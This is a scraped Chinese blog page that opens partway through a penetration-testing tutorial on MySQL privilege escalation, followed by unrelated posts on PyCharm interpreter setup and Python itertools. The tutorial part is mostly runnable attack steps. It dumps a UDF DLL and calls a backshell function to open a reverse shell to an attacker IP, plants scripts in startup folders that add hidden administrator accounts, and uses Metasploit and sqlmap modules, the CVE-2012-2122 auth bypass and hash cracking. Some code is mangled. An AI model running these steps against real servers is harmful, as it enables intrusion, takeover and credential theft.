<p>UdF自动提权：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python root.py -a 127.0.0.1 -p root -e <span class="string">"ver&amp;whoami"</span> -m udf</span><br></pre></td></tr></table></figure></p>
<p>LPK劫持提权：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python root.py -a 127.0.0.1 -p root -e <span class="string">"ver&amp;whoami"</span> -m lpk</span><br></pre></td></tr></table></figure></p>
<p>启动项提权：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python root.py -a 127.0.0.1 -p root -e <span class="string">"ver&amp;whoami"</span> –mst</span><br></pre></td></tr></table></figure></p>
<p>例如通过LOAD_FILE来查看Mysql配置文件my.ini，如果其中配置了skip-grant-tables，这无法进行提权</p>
<h2 id="无法获取webshell提权"><a href="#无法获取webshell提权" class="headerlink" title="无法获取webshell提权"></a>无法获取webshell提权</h2><h3 id="连接mysql"><a href="#连接mysql" class="headerlink" title="连接mysql"></a>连接mysql</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）mysql.exe -h ip -uroot -p</span><br><span class="line">（2）phpmyadmin</span><br><span class="line">（3）Navicat <span class="keyword">for</span> MySQL</span><br></pre></td></tr></table></figure>
<h3 id="查看数据库版本和数据路径"><a href="#查看数据库版本和数据路径" class="headerlink" title="查看数据库版本和数据路径"></a>查看数据库版本和数据路径</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   SELECT VERSION( );</span><br><span class="line">   Select @@datadir;</span><br><span class="line">   5.1以下版本，将dll导入到c:/windows或者c:/windows/system32/</span><br><span class="line">   5.1以上版本 通过以下查询来获取插件路径：</span><br><span class="line">SHOW VARIABLES WHERE Variable_Name LIKE <span class="string">"%dir"</span>;</span><br><span class="line">   show variables like <span class="string">'%plugin%'</span> ;</span><br><span class="line">   select load_file(<span class="string">'C:/phpStudy/Apache/conf/httpd.conf'</span>)</span><br><span class="line">   select load_file(<span class="string">'C:/phpStudy/Apache/conf/vhosts.conf'</span>)</span><br><span class="line">   select load_file(<span class="string">'C:/phpStudy/Apache/conf/extra/vhosts.conf'</span>)</span><br><span class="line">   select load_file(<span class="string">'C:/phpStudy/Apache/conf/extra/httpd.conf'</span>)</span><br><span class="line">   select load_file(<span class="string">'d:/phpStudy/Apache/conf/vhosts.conf'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="修改mysql-txt"><a href="#修改mysql-txt" class="headerlink" title="修改mysql.txt"></a>修改mysql.txt</h3><p>Mysql.txt为udf.dll的二进制文件转成十六进制代码。</p>
<p>（1）先执行导入ghost表中的内容修改以下代码的末尾代码 select backshell(“YourIP”,4444);</p>
<p>（2）导出文件到某个目录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select data from Ghost into dumpfile <span class="string">'c:/windows/mysqldll.dll'</span>; </span><br><span class="line">select data from Ghost into dumpfile <span class="string">'c:/windows/system32/mysqldll'</span>; </span><br><span class="line">select data from Ghost into dumpfile <span class="string">'c:/phpStudy/MySQL/lib/plugin/mysqldll'</span>; </span><br><span class="line">select data from Ghost into dumpfile <span class="string">'E:/PHPnow-1.5.6/MySQL-5.0.90/lib/plugin/mysqldll'</span>; </span><br><span class="line">select data from Ghost into dumpfile <span class="string">'C:/websoft/MySQL/MySQL Server5.5/lib/plugin/mysqldll.dll'</span> </span><br><span class="line">select data from Ghost into dumpfile <span class="string">'D:/phpStudy/MySQL/lib/plugin/mysqldll.dll'</span>; </span><br><span class="line">select load_file(<span class="string">'C:/ProgramData/MySQL/MySQL Server 5.1/Data/mysql/user.frm'</span>);</span><br><span class="line">select data from Ghost intodumpfile<span class="string">'C:\ProgramFiles\MySQL\MySQLServer5.1\lib/plugin/mysqldll.dll'</span></span><br></pre></td></tr></table></figure></p>
<p>（3）查看FUNCTION中是否存在cmdshell和backshell存在则删除：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drop FUNCTION cmdshell;//删除cmdshell</span><br><span class="line">drop FUNCTION backshell;//删除backshell</span><br></pre></td></tr></table></figure></p>
<p>创建backshell：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME <span class="string">'mysqldll.dll'</span>; //创建backshell</span><br></pre></td></tr></table></figure></p>
<p>在具备独立主机的服务器上执行监听:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv -l -p 44444</span><br></pre></td></tr></table></figure></p>
<p>执行查询：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select backshell(<span class="string">"192.192.192.1"</span>,44444);//修改</span><br></pre></td></tr></table></figure></p>
<p>192.192.192.1为你的IP和端口</p>
<h3 id="获取webshell后添加用户命令"><a href="#获取webshell后添加用户命令" class="headerlink" title="获取webshell后添加用户命令"></a>获取webshell后添加用户命令</h3><p>注意如果不能直接执行，则需要到c:\windows\system32\下执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user antian365 www.xianzhi.aliyun.com /add    </span><br><span class="line">net localgroup administrators antian365</span><br></pre></td></tr></table></figure></p>
<h2 id="sqlmap直连数据库提权"><a href="#sqlmap直连数据库提权" class="headerlink" title="sqlmap直连数据库提权"></a>sqlmap直连数据库提权</h2><p>Sqlmap直接连接数据库提权，需要有写入权限和root账号及密码，命令如下：</p>
<p>（1）连接数据库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -d <span class="string">"mysql://root:123456@219.115.1.1:3306/mysql"</span> --os-shell</span><br></pre></td></tr></table></figure></p>
<p>（2）选择操作系统的架构，32位操作系统选择1，64位选择2.</p>
<p>（3）自动上传udf或提示os-shell</p>
<p>（4）执行whomai命令如果获取系统权限，则表示提权成功。</p>
<h3 id="msfudf提权"><a href="#msfudf提权" class="headerlink" title="msfudf提权"></a>msfudf提权</h3><p>Kali渗透测试平台下执行（kali下载地</p>
<p><a href="https://www.kali.org/downloads/）：" target="_blank" rel="noopener">https://www.kali.org/downloads/）：</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/windows/mysql/mysql_payload</span><br><span class="line">options</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.2.1</span><br><span class="line"><span class="built_in">set</span> rport 3306</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line"><span class="built_in">set</span> password 123456</span><br><span class="line">run 0或者exploit</span><br></pre></td></tr></table></figure></p>
<p>msf下udf提权成功率并不高，跟windows操作系统版本，权限和数据库版本有关，特别是secure-file-priv选项，如果有该选项基本不会成功。</p>
<h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><h3 id="创建表并插入vbs脚本到表中"><a href="#创建表并插入vbs脚本到表中" class="headerlink" title="创建表并插入vbs脚本到表中"></a>创建表并插入vbs脚本到表中</h3><p>依次使用以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show databases ;</span><br><span class="line">use <span class="built_in">test</span>;</span><br><span class="line">show tables;</span><br><span class="line">create table a (cmd text); </span><br><span class="line">insert into a values (<span class="string">"set wshshell=createobject ("</span><span class="string">"wscript.shell"</span><span class="string">" ) "</span> ); </span><br><span class="line">insert into a values (<span class="string">"a=wshshell.run ("</span><span class="string">"cmd.exe /c net user aspnetaspnettest/add"</span><span class="string">",0)"</span>) ;</span><br><span class="line">insert into a values (<span class="string">"b=wshshell.run ("</span><span class="string">"cmd.exe /c net localgroup Administrators aspnet /add"</span><span class="string">",0) "</span> ); </span><br><span class="line">select \ from a;</span><br></pre></td></tr></table></figure></p>
<h3 id="导出vbs脚本到启动"><a href="#导出vbs脚本到启动" class="headerlink" title="导出vbs脚本到启动"></a>导出vbs脚本到启动</h3><p>使用以下命令将刚才在a表中创建的vbs脚本导出到启动选项中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select \ from a into outfile <span class="string">"C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs"</span>;</span><br></pre></td></tr></table></figure></p>
<p>导入成功后，系统重新启动时会自动添加密码为“1”且用户名称为“1”的用户到管理员组中。在实际使用过程中该脚本成功执行的几率比较低，有时候会出现不能导出的错误.<br>推荐使用以下脚本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show databases ;</span><br><span class="line">use <span class="built_in">test</span>;</span><br><span class="line">show tables;</span><br><span class="line">create table b (cmd text); </span><br><span class="line">insert into b values (<span class="string">"net user Aspnet123545345! /add"</span>);</span><br><span class="line">insert into b values (<span class="string">"net localgroup administrators Aspnet /add"</span>);</span><br><span class="line">insert into b values (<span class="string">"del b.bat"</span>);</span><br><span class="line">select  from b into outfile <span class="string">"C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\b.bat"</span>;</span><br></pre></td></tr></table></figure></p>
<p>该脚本执行后虽然会闪现Dos窗口，如果有权限导入到启动选项中，则一定会执行成功，在虚拟机中通过MySQL连接器连接并执行以上命令后，在C:\Documents and Settings\All Users\「开始」菜单\程序\启动目录中会有刚才导出的b.bat脚本文件</p>
<p>说明</p>
<p>在不同的操作系统中C:\Documents and Settings\All Users\「开始」菜单\程序\启动目录文件名称可能会不同，这个时候就要将其目录换成相应的目录名称即可。例如如果是英文版本操作系统则其插入的代码为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select  from b into outfile <span class="string">"C:\\Documents and Settings</span></span><br></pre></td></tr></table></figure></p>
<p>Windows 2008 Server的启动目录为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\iis.vbs</span><br></pre></td></tr></table></figure></p>
<p>其vbs方法可以参考如下写法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table a (cmd text);</span><br><span class="line">insert into a values (<span class="string">"set wshshell=createobject ("</span><span class="string">"wscript.shell"</span><span class="string">" ) "</span> );</span><br><span class="line">insert into a values (<span class="string">"a=wshshell.run ("</span><span class="string">"cmd.exe /c net user antian365 qwer1234!@# /add"</span><span class="string">",0) "</span> );</span><br><span class="line">insert into a values (<span class="string">"b=wshshell.run ("</span><span class="string">"cmd.exe /c net localgroup Administrators antian365 /add"</span><span class="string">",0) "</span> );</span><br><span class="line">select \ from a into outfile <span class="string">"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\iis.vbs"</span>;</span><br></pre></td></tr></table></figure></p>
<h3 id="msf下模块exploit-windows-mysql-mysql-start-up提权"><a href="#msf下模块exploit-windows-mysql-mysql-start-up提权" class="headerlink" title="msf下模块exploit/windows/mysql/mysql_start_up提权"></a>msf下模块exploit/windows/mysql/mysql_start_up提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_start_up</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.2.1</span><br><span class="line"><span class="built_in">set</span> rport 3306</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line"><span class="built_in">set</span> password 123456</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>msf下mysql_start_up提权有一定的几率，对英文版系统支持较好。</p>
<h1 id="Msf其它相关漏洞提权"><a href="#Msf其它相关漏洞提权" class="headerlink" title="Msf其它相关漏洞提权"></a>Msf其它相关漏洞提权</h1><h2 id="Mysql身份认证漏洞及利用-CVE-2012-2122"><a href="#Mysql身份认证漏洞及利用-CVE-2012-2122" class="headerlink" title="Mysql身份认证漏洞及利用(CVE-2012-2122)"></a>Mysql身份认证漏洞及利用(CVE-2012-2122)</h2><p>当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。按照公告说法大约256次就能够蒙对一次。受影响的产品：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">All MariaDB and MySQL </span><br><span class="line">versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 存在漏洞.</span><br><span class="line">MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23不存在漏洞.</span><br><span class="line">MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not不存在漏洞.</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br></pre></td></tr></table></figure>
<h2 id="exploit-windows-mysql-mysql-yassl-hello"><a href="#exploit-windows-mysql-mysql-yassl-hello" class="headerlink" title="exploit/windows/mysql/mysql_yassl_hello"></a>exploit/windows/mysql/mysql_yassl_hello</h2><h2 id="exploit-windows-mysql-scrutinizer-upload-exec"><a href="#exploit-windows-mysql-scrutinizer-upload-exec" class="headerlink" title="exploit/windows/mysql/scrutinizer_upload_exec"></a>exploit/windows/mysql/scrutinizer_upload_exec</h2><h1 id="mysql密码破解"><a href="#mysql密码破解" class="headerlink" title="mysql密码破解"></a>mysql密码破解</h1><h2 id="cain工具破解mysql密码"><a href="#cain工具破解mysql密码" class="headerlink" title="cain工具破解mysql密码"></a>cain工具破解mysql密码</h2><p>使用UltraEdit-32编辑器直接打开user.MYD文件，打开后使用二进制模式进行查看，在root用户后面是一串字符串，选中这些字符串将其复制到记事本中，这些字符串即为用户加密值，例如<br>506D1427F6F61696B4501445C90624897266DAE3。</p>
<p>注意：</p>
<p>（1）root后面的“”不要复制到字符串中。</p>
<p>（2）在有些情况下需要往后面看看，否则得到的不是完整的MYSQLSHA1密码，总之其正确的密码位数是40位。安装cain工具，使用cracker，右键单击“Add tolist”将Mysql Hashes值加入到破解列表中，使用软件中的字典、暴力破解等方式来进行暴力破解。</p>
<h2 id="网站在线密码破解"><a href="#网站在线密码破解" class="headerlink" title="网站在线密码破解"></a>网站在线密码破解</h2><h3 id="cmd5-com破解"><a href="#cmd5-com破解" class="headerlink" title="cmd5.com破解"></a>cmd5.com破解</h3><p>将获取的mysql值放在cmd5.com网站中进行查询，mysql密码一般都是收费的。</p>
<h3 id="somd5-com破解"><a href="#somd5-com破解" class="headerlink" title="somd5.com破解"></a>somd5.com破解</h3><p>Somd5.com是后面出现的一个免费破解网站，每次破解需要手工选择图形码进行破解，速度快，效果好，只是每次只能破解一个，而且破解一次后需要重新输入验证码。</p>
<h2 id="oclhash破解"><a href="#oclhash破解" class="headerlink" title="oclhash破解"></a>oclhash破解</h2><p>hashcat支持很多种破解算法，免费开源软件，官方网站<a href="https://hashcat.net/hashcat" target="_blank" rel="noopener">https://hashcat.net/hashcat</a><br>破解命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 200myql.hashpass.dict //破解MySQL323类型</span><br><span class="line">hashcat64.exe -m 300myql.hashpass.dict //破解MySQL4.1/MySQL5类型</span><br></pre></td></tr></table></figure></p>
<h2 id="John-the-Ripper-password-cracker"><a href="#John-the-Ripper-password-cracker" class="headerlink" title="John the Ripper password cracker"></a>John the Ripper password cracker</h2><p>John the Ripper下载地址：<a href="http://www.openwall.com/john/h/john179w2.zip，John" target="_blank" rel="noopener">http://www.openwall.com/john/h/john179w2.zip，John</a> the Ripper除了能够破解linux外，还能破解多种格式的密码。<br><code>`</code>bash<br>Echo 81F5E21E35407D884A6CD4A731AEBFB6AF209E1B&gt;hashes.txt<br>John –format =mysql-sha1 hashes.txt<br>john –list=formats | grep mysql //查看支持mysql密码破解的算法</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提取/">提取</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand [layout]" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/01/01/Pycharm 增加 Python3的路径/" title="Pycharm 增加 Python3的路径" itemprop="url">Pycharm 增加 Python3的路径</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>Pycharm默认的Python是python2，但是如果代码是python3写的，就需要在pycharm里的project interpreter增加python3</p>
<p>注意，一定要找到Project Interpreter，这里是一定可以添加python3的路径的。而不是在Run -&gt; Edit configuration -&gt; Python interpreter处添加。因为，如果你没有在前者添加Python3, 后者是没有这个选项的。当然，你在Project Interpreter处添加了python3之后，运行时可能还需要再改一下Edit configuration 里面的python interpreter, 把其选为python3。</p>
<p>如何找到Project Interpreter，以下是官方文档的介绍，但我的Mac路径和官方文档说的并不相同，而是在 File -&gt; default settings 里面。总之一定要找到Project Interpreter，才能正常添加。</p>
<p><a href="https://www.jetbrains.com/help/pycharm/installing-uninstalling-and-reloading-interpreter-paths.html" target="_blank" rel="noopener">https://www.jetbrains.com/help/pycharm/installing-uninstalling-and-reloading-interpreter-paths.html</a></p>
<p><a href="https://www.jetbrains.com/help/pycharm/project-interpreter.html" target="_blank" rel="noopener">https://www.jetbrains.com/help/pycharm/project-interpreter.html</a></p>
<p>后记，我最近发现，如果电脑里安装了多个python2.7或者python3.5, 3.6之类的，pycharm里有2个地方需要设置：</p>
<ol>
<li>File -&gt; default settings，在project interpreter里add locals，把你要用的这个python路径加进来。</li>
</ol>
<p>（如果找不到add locals，参考这篇文章：<a href="https://blog.csdn.net/codechelle/article/details/81203885）" target="_blank" rel="noopener">https://blog.csdn.net/codechelle/article/details/81203885）</a></p>
<ol start="2">
<li>Run -&gt; Edit configuration -&gt; Python interpreter 把interpreter改为你新添加的这个路径。</li>
</ol>
<p>其实还有一种方法，就是在打开pycharm的时候，不要选择左边一列原有的project，而是选“open”，打开你想用的这个python，比如在conda里面，就直接把这个路径打开。这样pycharm的环境就会自动读取你open的这个python。这时，你再在pycharm里打开你要跑的文件，应该就不需要重新配置了（当然，如果还需要重新配置，就用上述1、2重新配置下即可）。</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/编程开发/">编程开发</a>►<a class="article-category-link" href="/categories/编程开发/Python/">Python</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand [layout]" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/01/01/Python itertools模块详解/" title="Python itertools模块详解" itemprop="url">Python itertools模块详解</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>这货很强大, 必须掌握</p>
<p>文档 链接 <a href="http://docs.python.org/2/library/itertools.html" target="_blank" rel="noopener">http://docs.python.org/2/library/itertools.html</a></p>
<p>pymotw 链接 <a href="http://pymotw.com/2/itertools/" target="_blank" rel="noopener">http://pymotw.com/2/itertools/</a></p>
<p>基本是基于文档的翻译和补充，相当于翻译了</p>
<p>itertools用于高效循环的迭代函数集合</p>
<h1 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h1><p>总体，整体了解</p>
<p>无限迭代器<br>复制代码代码如下:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">迭代器         参数         结果                                                例子</span><br><span class="line">count()     start, [step]   start, start+step, start+2*step, ...                count(10) --&gt; 10 11 12 13 14 ...</span><br><span class="line">cycle()     p               p0, p1, ... plast, p0, p1, ...                      cycle(<span class="string">'ABCD'</span>) --&gt; A B C D A B C D ...</span><br><span class="line">repeat()    elem [,n]       elem, elem, elem, ... endlessly or up to n <span class="built_in">times</span>    repeat(10, 3) --&gt; 10 10 10</span><br></pre></td></tr></table></figure>
<p>　　<br>处理输入序列迭代器代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">迭代器          参数            结果                                        例子</span><br><span class="line">chain()     p, q, ...           p0, p1, ... plast, q0, q1, ...              chain(<span class="string">'ABC'</span>, <span class="string">'DEF'</span>) --&gt; A B C D E F</span><br><span class="line">compress()  data, selectors     (d[0] <span class="keyword">if</span> s[0]), (d[1] <span class="keyword">if</span> s[1]), ...         compress(<span class="string">'ABCDEF'</span>, [1,0,1,0,1,1]) --&gt; A C E F</span><br><span class="line">dropwhile() pred, seq           seq[n], seq[n+1], starting when pred fails  dropwhile(lambda x: x&lt;5, [1,4,6,4,1]) --&gt; 6 4 1</span><br><span class="line">groupby()   iterable[, keyfunc] sub-iterators grouped by value of keyfunc(v)</span><br><span class="line">ifilter()   pred, seq           elements of seq <span class="built_in">where</span> pred(elem) is True    ifilter(lambda x: x%2, range(10)) --&gt; 1 3 5 7 9</span><br><span class="line">ifilterfalse()  pred, seq       elements of seq <span class="built_in">where</span> pred(elem) is False   ifilterfalse(lambda x: x%2, range(10)) --&gt; 0 2 4 6 8</span><br><span class="line">islice()    seq, [start,] stop [, step] elements from seq[start:stop:step]  islice(<span class="string">'ABCDEFG'</span>, 2, None) --&gt; C D E F G</span><br><span class="line">imap()      func, p, q, ...     func(p0, q0), func(p1, q1), ...             imap(pow, (2,3,10), (5,2,3)) --&gt; 32 9 1000</span><br><span class="line">starmap()   func, seq           func(*seq[0]), func(*seq[1]), ...           starmap(pow, [(2,5), (3,2), (10,3)]) --&gt; 32 9 1000</span><br><span class="line">tee()       it, n               it1, it2 , ... itn splits one iterator into n</span><br><span class="line">takewhile() pred, seq           seq[0], seq[1], until pred fails            takewhile(lambda x: x&lt;5, [1,4,6,4,1]) --&gt; 1 4</span><br><span class="line">izip()      p, q, ...           (p[0], q[0]), (p[1], q[1]), ...             izip(<span class="string">'ABCD'</span>, <span class="string">'xy'</span>) --&gt; Ax By</span><br><span class="line">izip_longest()  p, q, ...       (p[0], q[0]), (p[1], q[1]), ...             izip_longest(<span class="string">'ABCD'</span>, <span class="string">'xy'</span>, fillvalue=<span class="string">'-'</span>) --&gt; Ax By C- D-</span><br></pre></td></tr></table></figure></p>
<p>组合生成器代码如下:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">迭代器          参数                        结果</span><br><span class="line">product()       p, q, ... [repeat=1]        cartesian product, equivalent to a nested <span class="keyword">for</span>-loop</span><br><span class="line">permutations()  p[, r]                      r-length tuples, all possible orderings, no repeated elements</span><br><span class="line">combinations()  p, r                        r-length tuples, <span class="keyword">in</span> sorted order, no repeated elements</span><br><span class="line">combinations_with_replacement() p, r        r-length tuples, <span class="keyword">in</span> sorted order, with repeated elements</span><br><span class="line">product(<span class="string">'ABCD'</span>, repeat=2)                   AA AB AC AD BA BB BC BD CA CB CC CD DA DB DC DD</span><br><span class="line">permutations(<span class="string">'ABCD'</span>, 2)                     AB AC AD BA BC BD CA CB CD DA DB DC</span><br><span class="line">combinations(<span class="string">'ABCD'</span>, 2)                     AB AC AD BC BD CD</span><br><span class="line">combinations_with_replacement(<span class="string">'ABCD'</span>, 2)    AA AB AC AD BB BC BD CC CD DD</span><br></pre></td></tr></table></figure>
<h1 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h1><h2 id="itertools-count-start-0-step-1"><a href="#itertools-count-start-0-step-1" class="headerlink" title="itertools.count(start=0, step=1)"></a>itertools.count(start=0, step=1)</h2><p>创建一个迭代器，生成从n开始的连续整数，如果忽略n，则从0开始计算（注意：此迭代器不支持长整数）</p>
<p>如果超出了sys.maxint，计数器将溢出并继续从-sys.maxint-1开始计算。</p>
<p>定义代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">def count(start=0, step=1):</span><br><span class="line">    <span class="comment"># count(10) --&gt; 10 11 12 13 14 ...</span></span><br><span class="line">    <span class="comment"># count(2.5, 0.5) -&gt; 2.5 3.0 3.5 ...</span></span><br><span class="line">    n = start</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        yield n</span><br><span class="line">        n += step</span><br><span class="line"></span><br><span class="line">```　　</span><br><span class="line">等同于(start + step * i <span class="keyword">for</span> i <span class="keyword">in</span> count())</span><br><span class="line"></span><br><span class="line">使用代码如下:</span><br><span class="line">```bash	</span><br><span class="line"></span><br><span class="line">from itertools import *</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> izip(count(1), [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>]):</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line"> </span><br><span class="line">(1, <span class="string">'a'</span>)</span><br><span class="line">(2, <span class="string">'b'</span>)</span><br><span class="line">(3, <span class="string">'c'</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="itertools-repeat-object-times"><a href="#itertools-repeat-object-times" class="headerlink" title="itertools.repeat(object[, times])"></a>itertools.repeat(object[, times])</h2><p>创建一个迭代器，重复生成object，times（如果已提供）指定重复计数，如果未提供times，将无止尽返回该对象。</p>
<p>定义代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">	</span><br><span class="line">def repeat(object, <span class="built_in">times</span>=None):</span><br><span class="line">    <span class="comment"># repeat(10, 3) --&gt; 10 10 10</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">times</span> is None:</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            yield object</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">times</span>):</span><br><span class="line">            yield object</span><br></pre></td></tr></table></figure></p>
